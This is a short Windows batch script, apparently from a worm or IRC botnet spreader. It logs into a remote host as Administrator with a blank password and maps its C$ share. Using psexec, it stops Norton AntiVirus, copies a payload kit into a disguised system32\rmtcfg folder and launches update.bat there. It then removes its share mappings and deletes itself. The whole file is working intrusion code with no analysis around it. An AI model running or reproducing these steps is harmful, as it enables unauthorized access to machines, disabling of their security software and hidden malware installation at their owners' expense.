user_nick |wRu|PY728
net use \\66.21.77.201 /USER:Administrator
net use x: \\66.21.77.201\C$
psexec \\66.21.77.201 -u Administrator -p "" net stop "Norton AntiVirus Server"
psexec \\66.21.77.201 -u Administrator -p "" -c temp.bat
mkdir x:\winnt\system32\rmtcfg
mkdir x:\winnt\system32\catroot
copy copy\* x:\winnt\system32\rmtcfg
mkdir x:\winnt\system32\rmtcfg\files
mkdir x:\winnt\system32\rmtcfg\files\copy
mkdir x:\winnt\system32\rmtcfg\files\dat
mkdir x:\winnt\system32\rmtcfg\files\log
mkdir x:\winnt\system32\rmtcfg\files\plugin
copy C:\WINNT\system32\rmtcfg\files\* x:\winnt\system32\rmtcfg\files
copy copy\* x:\winnt\system32\rmtcfg\files\copy
copy plugin\* x:\winnt\system32\rmtcfg\files\plugin
copy dat\* x:\winnt\system32\rmtcfg\files\dat
psexec \\66.21.77.201 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update.bat
net use x: /delete
net use \\66.21.77.201 /delete
del runme386543.bat
